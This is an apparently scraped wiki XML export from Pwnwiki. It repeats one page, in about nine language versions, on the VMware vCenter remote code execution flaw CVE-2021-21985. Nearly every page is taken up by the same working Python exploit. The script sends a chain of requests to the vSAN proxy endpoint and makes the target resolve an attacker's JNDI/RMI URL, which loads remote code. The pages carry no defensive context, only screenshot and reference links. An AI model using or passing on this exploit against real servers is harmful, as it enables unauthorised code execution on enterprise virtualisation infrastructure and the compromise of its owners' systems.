    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
      <sha1>fwlqahq40k1h8nyop2to53v394amqzp</sha1>
    </revision>
    <revision>
      <id>4030</id>
      <parentid>4029</parentid>
      <timestamp>2021-06-05T01:39:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4030</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2645" sha1="9alihgid2r9bpu7koorvrpemfwp3qq7" xml:space="preserve">&lt;languages   /&gt;
&lt;translate&gt;
==截圖== &lt;!--T:1--&gt;
&lt;/translate&gt;
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


&lt;translate&gt;
==參考== &lt;!--T:2--&gt;
&lt;/translate&gt;
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
      <sha1>9alihgid2r9bpu7koorvrpemfwp3qq7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21985 VMware vCenter 遠程任意代碼執行漏洞/ar</title>
    <ns>0</ns>
    <id>3499</id>
    <revision>
      <id>4067</id>
      <timestamp>2021-06-05T01:47:31Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== المرجع =="</comment>
      <origin>4067</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2598" sha1="9a33vmyjnh2oxq7eyfurwatxqm3mnh3" xml:space="preserve">&lt;languages   /&gt;
== لقطة الشاشة ==
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


== المرجع ==
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
      <sha1>9a33vmyjnh2oxq7eyfurwatxqm3mnh3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21985 VMware vCenter 遠程任意代碼執行漏洞/de</title>
    <ns>0</ns>
    <id>3489</id>
    <revision>
      <id>4057</id>
      <timestamp>2021-06-05T01:45:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-21985 VMware vCenter Remote-Sicherheitslücke bei willkürlicher Codeausführung"</comment>
      <origin>4057</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2581" sha1="ipg5ftmtagqmke2fb0b687to8ksdyzh" xml:space="preserve">&lt;languages   /&gt;
==Screenshot==
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


== Referenz ==
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
      <sha1>ipg5ftmtagqmke2fb0b687to8ksdyzh</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21985 VMware vCenter 遠程任意代碼執行漏洞/en</title>
    <ns>0</ns>
    <id>3474</id>
    <revision>
      <id>4042</id>
      <timestamp>2021-06-05T01:42:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Reference=="</comment>
      <origin>4042</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2580" sha1="4fn57t4vz202h96htre29phl4ztcpy6" xml:space="preserve">&lt;languages   /&gt;
==Screenshot==
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


==Reference==
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
      <sha1>4fn57t4vz202h96htre29phl4ztcpy6</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21985 VMware vCenter 遠程任意代碼執行漏洞/es</title>
    <ns>0</ns>
    <id>3505</id>
    <revision>
      <id>4073</id>
      <timestamp>2021-06-05T01:51:03Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Referencia =="</comment>
      <origin>4073</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2594" sha1="erqslqwc1bqlz7yvfx941hougpt0atl" xml:space="preserve">&lt;languages   /&gt;
== Captura de pantalla ==
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


== Referencia ==
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
      <sha1>erqslqwc1bqlz7yvfx941hougpt0atl</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21985 VMware vCenter 遠程任意代碼執行漏洞/fa</title>
    <ns>0</ns>
    <id>3508</id>
    <revision>
      <id>4076</id>
      <timestamp>2021-06-05T01:53:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-21985 آسیب پذیری اجرای کد دلخواه از راه دور VMware vCenter"</comment>
      <origin>4076</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2588" sha1="ryi19kz5oqtl1b4evk27kozt6dhx526" xml:space="preserve">&lt;languages   /&gt;
== عکس صفحه ==
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


== مرجع ==
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
      <sha1>ryi19kz5oqtl1b4evk27kozt6dhx526</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21985 VMware vCenter 遠程任意代碼執行漏洞/fr</title>
    <ns>0</ns>
    <id>3507</id>
    <revision>
      <id>4075</id>
      <timestamp>2021-06-05T01:51:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Référence=="</comment>
      <origin>4075</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2588" sha1="1ani0apvefh7eh132cdkuz7oh94ui15" xml:space="preserve">&lt;languages   /&gt;
==Capture d'écran==
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


==Référence==
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
      <sha1>1ani0apvefh7eh132cdkuz7oh94ui15</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21985 VMware vCenter 遠程任意代碼執行漏洞/he</title>
    <ns>0</ns>
    <id>3504</id>
    <revision>
      <id>4072</id>
      <timestamp>2021-06-05T01:50:05Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== הפניה =="</comment>
      <origin>4072</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2592" sha1="knet02h39rc83sr024mf6sj7udd2fjd" xml:space="preserve">&lt;languages   /&gt;
== צילום מסך ==
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


== הפניה ==
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
      <sha1>knet02h39rc83sr024mf6sj7udd2fjd</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21985 VMware vCenter 遠程任意代碼執行漏洞/id</title>
    <ns>0</ns>
    <id>3516</id>
    <revision>
      <id>4084</id>
      <timestamp>2021-06-05T02:03:59Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Tangkapan layar =="</comment>
      <origin>4084</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2589" sha1="nhjoho1ucvjmmb0yyfz45aey81iq0vy" xml:space="preserve">&lt;languages   /&gt;
== Tangkapan layar ==
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


== Referensi ==
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
      <sha1>nhjoho1ucvjmmb0yyfz45aey81iq0vy</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21985 VMware vCenter 遠程任意代碼執行漏洞/pt</title>
    <ns>0</ns>
    <id>3503</id>
    <revision>
      <id>4071</id>
      <timestamp>2021-06-05T01:49:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Referência =="</comment>
      <origin>4071</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2591" sha1="eziibdv0ac3sf7kvl0xol94viol65hc" xml:space="preserve">&lt;languages   /&gt;
== Captura de tela ==
[[File:Twitter_E3CB24AUUAEl1_8.jpg | 800px ]]


==EXP==
&lt;pre&gt;
import requests
import sys
import json
def send_request(host,uri,json):
    try:
        req = requests.post(url=host+baseuri+uri,json=json,headers=headers,verify=False)
        return req.text
    except:
        return False
def check_false(request):
    if request ==False or 'result' not in request:
        print("[*] No Vuln!")
        return True
if __name__ == '__main__':
    if len(sys.argv) &lt; 2:
        print('''python3 cve-2021-21985.py https://host rmi://8.8.8.8:1099/Exploit''')
        sys.exit()
    host = sys.argv[1]
    payload = sys.argv[2]
    baseuri = "ui/h5-vsan/rest/proxy/service/&amp;vsanQueryUtil_setDataService"
    uris = ["/setTargetObject", "/setStaticMethod", "/setTargetMethod", "/setArguments", "/prepare", "/invoke"]
    headers = {'Content-Type': 'application/json', "User-Agent": "pentest"}
    stage_setTargetObject = json.loads('{"methodInput":[null]}')
    stage_setStaticMethod = json.loads('{"methodInput":["javax.naming.InitialContext.doLookup"]}')
    stage_setTargetMethod = json.loads('{"methodInput":["doLookup"]}')
    stage_setArguments = json.loads('{"methodInput":[["%s"]]}'%payload)
    stage_prepare = json.loads('{"methodInput":[]}')
    print("[*] start init TargetObject")
    # init TargetObject
    init_request  = send_request(host,uris[0],json=stage_setTargetObject)
    if check_false(init_request):
        print("[*] init failed!")
        exit()
    # Step2 setStaticMethod
    StaticMethod = send_request(host,uris[1],json=stage_setStaticMethod)
    if check_false(init_request):
        print("[*] StaticMethod init failed!")
        exit()
    # Step3 setTargetMethod
    StaticMethod = send_request(host,uris[2],json=stage_setTargetMethod)
    if check_false(init_request):
        print("[*] setTarget Method failed!")
        exit()
    # Step4 setArguments
    # print(stage_setArguments)
    setArguments = send_request(host,uris[3],json=stage_setArguments)
    if check_false(init_request):
        print("[*] setArguments failstage_setArgumentsed!")
        exit()
    # Step5 prepare
    setArguments = send_request(host,uris[4],json=stage_prepare)
    if check_false(init_request):
        print("[*] stage_prepare failed!")
        exit()
    # Step6 invoke
    setArguments = send_request(host,uris[5],json=stage_prepare)
    if check_false(init_request):
        print("[*] invoke failed!")
        exit()
&lt;/pre&gt;


== Referência ==
https://github.com/xnianq/cve-2021-21985_exp/

https://twitter.com/_0xf4n9x_?s=21</text>
